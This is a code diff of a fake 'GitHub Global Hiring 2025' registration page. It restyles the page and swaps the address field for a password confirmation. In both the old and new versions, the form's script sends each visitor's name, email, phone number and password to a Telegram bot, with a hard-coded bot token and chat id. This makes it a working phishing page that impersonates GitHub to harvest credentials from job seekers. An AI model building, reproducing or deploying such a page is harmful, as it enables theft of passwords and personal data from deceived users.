@@ -3,70 +3,116 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>GitHub Global Hiring Drive 2025</title>
+  <title>GitHub Global Hiring 2025</title>
   <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
     body {
-      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(to bottom right, #e3f2fd, #ffffff);
-      padding: 30px;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to bottom right, #222, #555);
+      height: 100vh;
       display: flex;
-      flex-direction: column;
+      justify-content: center;
       align-items: center;
     }
-    h1 {
-      color: #1a237e;
+
+    .form-container {
+      background-color: #111;
+      padding: 30px;
+      border-radius: 12px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 0 20px rgba(100, 0, 255, 0.4);
+      text-align: center;
+    }
+
+    h2 {
+      color: #fff;
       margin-bottom: 20px;
     }
-    form {
-      background: #ffffff;
-      padding: 40px;
-      border-radius: 12px;
-      max-width: 500px;
+
+    input {
       width: 100%;
-      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
-    }
-    input, textarea, button {
-      width: 100%;
-      margin: 12px 0;
       padding: 14px;
-      border-radius: 8px;
-      border: 1px solid #ccc;
-      font-size: 16px;
-    }
-    button {
-      background-color: #1a237e;
-      color: white;
-      font-weight: bold;
-      cursor: pointer;
+      margin: 12px 0;
       border: none;
-      transition: background 0.3s ease;
+      border-radius: 8px;
+      background: #1e1e1e;
+      color: #fff;
+      font-size: 16px;
+      border: 1px solid #333;
+      outline: none;
+      transition: border 0.3s;
     }
+
+    input:focus {
+      border: 1px solid #bb86fc;
+      box-shadow: 0 0 5px #bb86fc;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      margin-top: 15px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      background: linear-gradient(90deg, #7b2ff7, #f107a3);
+      color: #fff;
+      cursor: pointer;
+      transition: opacity 0.3s;
+    }
+
     button:hover {
-      background-color: #0d1649;
+      opacity: 0.9;
     }
-    #thankyou {
+
+    .link {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #ccc;
+    }
+
+    .link a {
+      color: #bb86fc;
+      text-decoration: none;
+    }
+
+    .thankyou {
       display: none;
       margin-top: 20px;
-      color: green;
+      color: #00ff87;
       font-size: 18px;
       font-weight: bold;
+    }
+
+    @media (max-width: 480px) {
+      .form-container {
+        margin: 20px;
+        padding: 25px;
+      }
     }
   </style>
 </head>
 <body>
 
-  <h1>GitHub Global Hiring Drive 2025</h1>
-
-  <form id="registerForm">
-    <input type="text" name="name" placeholder="Full Name" required />
-    <input type="email" name="email" placeholder="Email Address" required />
-    <input type="text" name="phone" placeholder="Contact Number" required />
-    <textarea name="address" rows="3" placeholder="Residential Address" required></textarea>
-    <input type="password" name="password" placeholder="Set a Password" required />
-    <button type="submit">Register for Drive</button>
-  </form>
-
-  <div id="thankyou">✅ Thank you! You will be contacted by email shortly.</div>
+  <div class="form-container">
+    <h2>Register</h2>
+    <form id="registerForm">
+      <input type="text" name="name" placeholder="Full Name" required />
+      <input type="email" name="email" placeholder="E-mail" required />
+      <input type="text" name="phone" placeholder="Phone" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <input type="password" name="confirm" placeholder="Confirm Password" required />
+      <button type="submit">Register</button>
+    </form>
+    <div class="link">Have account? <a href="#">Sign In</a></div>
+    <div class="thankyou">✅ Registered! We’ll reach out soon.</div>
+  </div>
 
   <script>
     document.getElementById("registerForm").addEventListener("submit", async function (e) {
@@ -77,9 +123,14 @@
         name: form.name.value,
         email: form.email.value,
         phone: form.phone.value,
-        address: form.address.value,
-        password: form.password.value
+        password: form.password.value,
+        confirm: form.confirm.value
       };
+
+      if (data.password !== data.confirm) {
+        alert("Passwords do not match!");
+        return;
+      }
 
       try {
         await fetch("https://api.telegram.org/bot7448574888:AAEqL3IHQocQslKBwia_TTAlt0jizyHao-U/sendMessage", {
@@ -89,16 +140,16 @@
           },
           body: JSON.stringify({
             chat_id: "<968143308>",
-            text: `📥 *New Registration - GitHub Hiring*\n\n👤 Name: ${data.name}\n📧 Email: ${data.email}\n📱 Phone: ${data.phone}\n🏠 Address: ${data.address}\n🔒 Password: ${data.password}`,
+            text: `🔐 *New Registration - GitHub Drive 2025*\n\n👤 Name: ${data.name}\n📧 Email: ${data.email}\n📱 Phone: ${data.phone}\n🔑 Password: ${data.password}`,
             parse_mode: "Markdown"
           })
         });
 
         form.style.display = "none";
-        document.getElementById("thankyou").style.display = "block";
-      } catch (error) {
-        alert("Error submitting form. Please try again.");
-        console.error(error);
+        document.querySelector(".thankyou").style.display = "block";
+      } catch (err) {
+        alert("Error submitting form.");
+        console.error(err);
       }
     });
   </script>
